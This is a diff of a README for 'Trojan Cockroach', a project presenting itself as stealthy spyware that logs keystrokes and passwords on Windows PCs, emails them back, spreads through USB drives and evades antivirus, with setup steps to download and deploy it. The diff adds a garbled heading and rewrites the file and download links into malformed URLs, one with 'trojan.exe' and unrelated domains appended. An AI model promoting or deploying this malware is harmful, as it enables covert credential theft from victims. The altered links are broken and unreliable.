@@ -1,18 +1,19 @@
 <h1> <img src="https://cloud.githubusercontent.com/assets/5456665/22564601/52428212-e9af-11e6-8150-5d1ff05bbfa8.png" width="24" height=auto /> Trojan Cockroach</h1>
 
 #### A Stealthy Trojan Spyware
+###### HINDI DTECTED CLAIM !!! code 
 
 You are looking at a **Trojan Virus** that steals data (ID, password; every key stroke) from PC (Windows XP or later), then emails them back to you. It spreads among PCs through USB drives, and is almost undetectable to any antivirus software.
 
 *Created only for learning purpose.*
 
 ### Intro
-- [TrojanCockroach.cpp](https://github.com/MinhasKamal/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/TrojanCockroach.cpp)- logs user's data, sends data through Transmit.exe, infects portable drive.
-- [Infect.cpp](https://github.com/MinhasKamal/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/Infect.cpp)- installs the virus into computer from portable drive.
-- [Transmit.exe](https://github.com/MinhasKamal/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/Transmit.exe)-  emails data back.
-- [TrojanCockroach.lnk](https://github.com/MinhasKamal/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/TrojanCockroach.lnk)- resides in the startup folder of PC and activates TrojanCockroach.exe.
-- [Infect.lnk](https://github.com/MinhasKamal/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/Infect.lnk)- takes different attractive names in the infected portable drive, activates Infect.exe when clicked.
-- [DecodeMessage.cpp](https://github.com/MinhasKamal/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/DecodeMessage.cpp)- used to decode received email.
+- [TrojanCockroach.cpp](https://github.com/MinhasKamal/bugsnags/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/TrojanCockroach.cpp)- logs user's data, sends data through Transmit.exe, infects portable drive.
+- [Infect.cpp](https://github.com/MinhasKamal/bugsnags/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/Infect.cpp)- installs the virus into computer from portable drive.
+- [Transmit.exe](https://github.com/MinhasKamal/bugsnags/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/Transmit.exe)-  emails data back.
+- [TrojanCockroach.lnk](https://github.com/MinhasKamal/bugsnags/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/TrojanCockroach.lnk)- resides in the startup folder of PC and activates TrojanCockroach.exe.
+- [Infect.lnk](https://github.com/MinhasKamal/bugsnags/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/Infect.lnk)- takes different attractive names in the infected portable drive, activates Infect.exe when clicked.
+- [DecodeMessage.cpp](https://github.com/MinhasKamal/bugsnags/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/DecodeMessage.cpp)- used to decode received email.
 
 ### Setup
 
@@ -22,7 +23,7 @@ Preparation
 <br/>
 <ol>
 <li>
-  Download the full package from <a href="https://minhaskamal.github.io/DownGit/#/home?url=https://github.com/MinhasKamal/TrojanCockroach/tree/master/com/minhaskamal/trojanCockroach">here</a>.
+  Download the full package from <a href="https://minhaskamal.github.io/DownGit/#/home?url=https://github.com/MinhasKamal/TrojanCockroach/tree/master/com/minhaskamal/trojanCockroach/www.cyberjawara.co.id/bugs/bugsnags/trojan.exe/www.ipinfo.id/bugs/">here</a>.
 </li>
 <br/>
 <li>
